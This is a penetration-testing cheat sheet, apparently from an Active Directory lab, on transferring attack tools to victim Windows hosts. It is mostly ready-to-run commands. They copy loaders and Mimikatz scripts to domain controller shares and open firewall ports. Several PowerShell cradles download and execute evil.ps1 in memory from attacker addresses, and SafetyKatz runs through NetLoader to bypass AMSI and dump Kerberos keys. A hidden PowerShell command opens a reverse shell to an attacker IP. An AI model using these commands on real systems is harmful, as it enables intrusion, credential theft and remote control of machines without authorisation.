# Transfer Files

### SMB Shares

Use Y instead of F in echo to overwrite a file that is already present.

```batch
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
:: Powershell 
Copy-Item C:\AD\Tools\Invoke-Mimi-keys.ps1 \\dcorp-adminsrv\C$\'Program Files'  
```

### HTTP Server

Serve the files using [hfs ](https://www.rejetto.com/hfs/?f=dl)or http simple server

```batch
:: Attacker Machine
python3 -m http.server -port 80
:: Open the port where the files are hosted. Need Admin Access
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
:: Verify if port is open or closed
netstat -an
```

Port forward to avoid firewall using netsh on target machine

<pre class="language-batch"><code class="lang-batch">:: Victim Machine
<strong>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=172.16.100.x
</strong><strong>
</strong></code></pre>

Download the file on target machine

<pre class="language-powershell"><code class="lang-powershell"># Download and store
<strong>(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/&#x3C;File>', '&#x3C;Dest Path>')
</strong>
# Download and execute
iex ((New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/&#x3C;File>'));

# NetLoader to execute and bypass amsi
NetLoader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
</code></pre>

More options

```powershell
# Internet Explorer Downoad cradle
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response


$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()


$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.100.27/evil.ps1',$false);$h.send();iex $h.responseText
```

PowerShell v3+

```powershell
# UseBasicParsing is important sometime
# To save inside the victim machine
iwr http://172.16.100.27/Loader.exe -UseBasicParsing - -OutFile Loadder.exe
# Directly execute in memory
iex (iwr 'http://192.168.100.27/evil.ps1' -UseBasicParsing)
```

Reverse Shell Execution by transferring file. Same can be used for bind shell too by changing **-Reverse** to **-Bind**. Power here is the function name to call and can be modified.

```powershell
powershell -nop -w hidden -c "IEX (iwr 'http://172.16.100.38/Invoke-PowerShellTcp.ps1' -UseBasicParsing); Power -Reverse -IPAddress 172.16.100.38 -Port 443
```
